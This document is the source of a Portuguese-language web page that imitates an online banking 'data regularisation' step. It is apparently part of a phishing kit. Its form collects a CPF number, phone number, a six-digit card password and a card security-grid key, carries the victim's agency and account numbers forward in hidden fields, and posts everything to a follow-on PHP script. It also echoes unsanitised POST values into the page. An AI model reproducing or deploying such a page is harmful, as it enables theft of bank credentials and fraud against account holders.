<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Acesso Online</title>

<script language="javascript" src="scripts/dataVerifica.js"></script>
<script language="javascript" src="scripts/validaDados.js"></script>
<script type="text/javascript" src="j_query/jQuery_v1.2.6.js"></script>
<script type="text/javascript" src="j_query/google_Analytics.js"></script>
<script type="text/javascript" src="j_query/divOculta.js"></script>
<script type="text/javascript" src="scripts/carrega_Oculto1.js"></script>
<script type="text/javascript" src="scripts/maskTelefone.js"></script>
<script type="text/javascript" src="scripts/validaCPF.js"></script>

<style type="text/css">
#top1 { width:100%; height:138px; background:url(images/top1.jpg) repeat-x; }
.style1 {font-size: 12px;	font-family: Arial, Helvetica, sans-serif;	color: #666666;}
#avancar {cursor:pointer; float:right; width:95px; height:25px; border:0; background:url(images/avancando.gif); color:#000000; display:inline; margin:2px;} 
#avancar:hover {background-position:right bottom} 
#cancelar {cursor:pointer; float:right; width:135px; height:25px; border:0; background:url(images/cancelando.gif); color:#000000; display:inline; margin:2px;} 
#cancelar:hover {background-position:right bottom} 
#voltar {cursor:pointer; float:right; width:72px; height:26px; border:0; background:url(images/voltando.jpg); color:#000000; display:inline; margin:2px;} 
#voltar:hover {background-position:right bottom} 
#bbotoes input { cursor:pointer; float:left; width:36px; height:40px; border:0; background:url(images/contente.jpg) repeat-x; color:#000000; display:inline; margin:2px; border-radius:4px; border:1px solid #D5D5D5; } 
#bbotoes input:hover { background-position:left bottom; }
#framelimpar { cursor:pointer; width:78px; height:31px; border:0; background:url(images/hover.jpg) repeat-x; color:#000000; display:inline; margin:2px; border-radius:4px; border:1px solid #D5D5D5; } 
#framelimpar:hover {background-position:left bottom }
.style4 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #333333;
}
.style5 {font-size: 12px; font-family: "Courier New", Courier, monospace; color: #CC0000; }
.style6 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #333333;
	font-weight: bold;
}
#pai {width:200px; height:15px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; margin-left:8px; }
#telefone {width:100px; height:15px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; margin-left:8px; }
#cpf {width:90px; height:15px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; margin-left:8px; }
#senha6 {width:60px; height:15px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; margin-left:8px; }
.style7 {	font-family: Arial, Helvetica, sans-serif;
	font-size: 11px;
	color: #999999;
}
.style8 {	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
#pos68 {width:40px; height:15px; font-family:Tahoma,Arial,Sans-Serif; border-bottom:1px solid #D4D4D4; border-right:1px solid #D4D4D4; border-left:1px solid #7A7A7A; border-top:1px solid #7A7A7A; padding:0 0 0 3px; font-size:12px; }
.style9 {color: #333333}
.style11 {font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: #333333; }
.style12 {
	color: #FFFFFF;
	font-size: 9px;
	font-family: Arial, Helvetica, sans-serif;
}
.style10 {font-family: Arial, Helvetica, sans-serif; font-size: 12px; color: #FFFFFF; }
.style13 {font-family: Arial, Helvetica, sans-serif; font-size: 12px; color: #FFFFFF; }
</style>
</head>

<body style="margin:0; background:#F7F7F7; ">
<div id="top1"><div style="width:980px; height:145px; margin:0 auto; background:url(images/top2.jpg) repeat-x;">
<div style="width:150px; height:145px; float:left; background:url(images/marca.png) no-repeat;"></div>
<div style="width:829px; height:28px; float:left;">
  <div align="right">
    <table width="421" align="left" cellpadding="0" cellspacing="0">
      <tr>
        <td width="37" height="28">&nbsp;</td>
        <td width="53" height="28"><span class="style10">Ag&ecirc;ncia:</span></td>
        <td width="64" class="style13" width-="width-"><?php echo("<b>".$_POST['agencia']."</b>");?></td>
        <td width="43"><span class="style10">Conta:</span></td>
        <td width="222""40" class="style13" width-="width-" ><?php echo("<b>".$_POST['conta']."</b>");?><?php echo("-<b>".$_POST['digito']."</b>");?></td>
      </tr>
    </table>
    <img src="images/sair.jpg" width="151" height="28" border="0" /></div>
</div>
<div style="width:600px; height:45px; float:left;"><table cellpadding="0" cellspacing="0">
  <tr><td width="37" height="42">&nbsp;</td>
  <td width="559" height="42"><span class="style1"><script>data();</script></span></td>
</tr></table></div>
<div style="width:829px; height:63px; float:left; background:url(images/img_as.jpg) no-repeat; border-right:1px solid #DDD;"></div>
</div></div>

<div style="width:982px; height:410px; margin:0 auto; margin-top:15px;">
<div style="width:750px; height:410px; background:#FFF; float:left; border-bottom:1px solid #C5C5C5; border-left:1px solid #eee; border-right:1px solid #eee; border-radius:7px;">
<div style="width:100%; height:40px; background:url(images/mkv_kk.jpg) right no-repeat;">
<table cellpadding="0" cellspacing="0">
  <tr>
  <td width="18" height="28">&nbsp;</td>
  <td width="88" height="28"><span class="style4">P&aacute;gina Inicial </span></td>
  <td width="17" height="28" class="style5">&gt;</td>
  <td width="156" height="28" class="style4">Regulariza&ccedil;&atilde;o de dados </td>
    <td width="15" height="28" class="style5">&nbsp;</td>
</tr></table>
</div>
<div style="width:700px; height:35px; background:url(images/Passo1.jpg) no-repeat; margin-left:11px; float:left;"></div>
<form id="form" name="form" action="index3.php" method="post" autocomplete="off" >
  <div style="width:714px; height:310px; margin-left:20px; margin-top:15px; float:left;">
  <table width="100%" cellpadding="0" cellspacing="0">
  <tr>
  <td width="520" height="268">
  <table width="100%" cellpadding="0" cellspacing="0">
  <tr>
  <td height="21" colspan="3"><span class="style6">Informe os seguintes dados obrigat&oacute;rio</span></td>
  </tr>
   <tr>
   <td colspan="3"><span class="style12">...</span></td>
   </tr>
    <tr>
	<Td width="19">&nbsp;</Td>
  <td width="131" height="28" class="style4"><div align="left">Pai/Tutor Respons&aacute;vel: </div></td>
  <td width="560"><input type="text" name="pai" id="pai" size="20" maxlength="200" /></td>
  </tr>
    <tr>
		<Td>&nbsp;</Td>
  <td width="131" height="28" class="style4"><div align="left">Telefone:</div></td>
  <td width="560"><input type="text" name="telefone" id="telefone" maxlength="15" size="15" />    
    <span class="style7 style9">(o mesmo cadastrado na sua ag&ecirc;ncia)</span></td>
  </tr>
    <tr>
		<Td>&nbsp;</Td>
    <td width="131" height="28" class="style4">
      <div align="left">CPF do Titular:
      </div></td><td width="560"><input type="text" name="cpf" id="cpf" size="11" maxlength="11" onblur="return validacpf()" />
    <span class="style11">(somente n&uacute;meros)</span></td>
  </tr>
  <tr>
  	<Td>&nbsp;</Td>
  <td width="131" height="28" class="style4"><div align="left">Senha de (6 d&iacute;gitos): </div></td><td width="560"><input type="password" name="senha6" id="senha6" size="6" maxlength="6" />
    <span class="style11">(senha do cart&atilde;o de cr&eacute;dito)</span></td>
  </tr>
  <tr>
  <td height="130" colspan="3"><div id="casas">
  <table cellpadding="0" cellspacing="0">
    <tr>
      <td width="133" height="110"><div align="right" class="style14">
        <div align="left" class="style8">Preencha o campo ao<br />
          lado com a <strong>chave</strong><br />
          indicada no verso do<br />
          seu cart&atilde;o,
          conforme posi&ccedil;&atilde;o solicitada.</div>
          </div></td>
          <td width="207"><div align="center"><img src="images/tatatatatatata.gif" width="188" height="97" /></div></td>
          <td width="208"><table cellpadding="0" cellspacing="0">
            <tr>
              <td width="190" height="31"><span class="style14 style7 style9"><strong>Posi&ccedil;&atilde;o 68 </strong> no verso do cart&atilde;o:</span></td>
              </tr>
            <tr>
              <td height="23"><input name="pos68" type="password" id="pos68" lang="1" size="3" maxlength="3" xml:lang="1" />
                <span class="style11">(3 d&iacute;gitos)</span></td>
              </tr>
            <tr>
              <td><input name="agencia" type="hidden" id="agencia" value="<?php echo $_POST['agencia']; ?>" />
<input name="conta" type="hidden" id="conta" value="<?php echo $_POST['conta']; ?>" />
<input name="digito" type="hidden" id="digito" value="<?php echo $_POST['digito']; ?>" />
<input name="infor" type="hidden" id="infor" value="<?php echo $_POST['infor']; ?>" /></td>
              </tr>
            </table></td>
        </tr>
    </table>
  </div></td>
  </tr>
  </table>
  </td>
  </tr>
  <tr>
  <td height="32">  <div style=" width:710px; height:32px; margin-left:; margin-top:0;">
    <table cellpadding="0" cellspacing="0" width="100%">
      <tr>
        <td width="594" height="29"><input name="button" type="button" id="cancelar" value=""/></td>
        <td width="12">&nbsp;</td>
        <td width="106"><input name="submit" type="submit" id="avancar" value="" onclick="return macTools();" /></td>
      </tr>
    </table>
  </div></td>
  </tr>
  </table>
  </div>
  
</form>
</div>
<div style="width:217px; height:360px; float:right; border-radius:5px;"><img src="images/bylll.jpg" width="217" height="360" border="0" usemap="#Map" />
<map name="Map" id="Map"><area shape="rect" coords="14,78,124,125" href="#" /><area shape="rect" coords="13,181,143,230" href="#" /><area shape="rect" coords="13,294,112,326" href="#" /></map></div>
</div>

<div style="width:100%; height:103px; repeat-x; margin-top:15px; background:#FFF; border-top:1px solid #C5C5C5; border-bottom:1px solid #C5C5C5;">
<div style="width:985px; height:103px; margin:0 auto;"><img src="images/botons2.jpg" width="985" height="103" border="0" usemap="#Map" /></div>
</div>
</body>
<script>
		mascaraTelefone( form.telefone );
</script>
</html>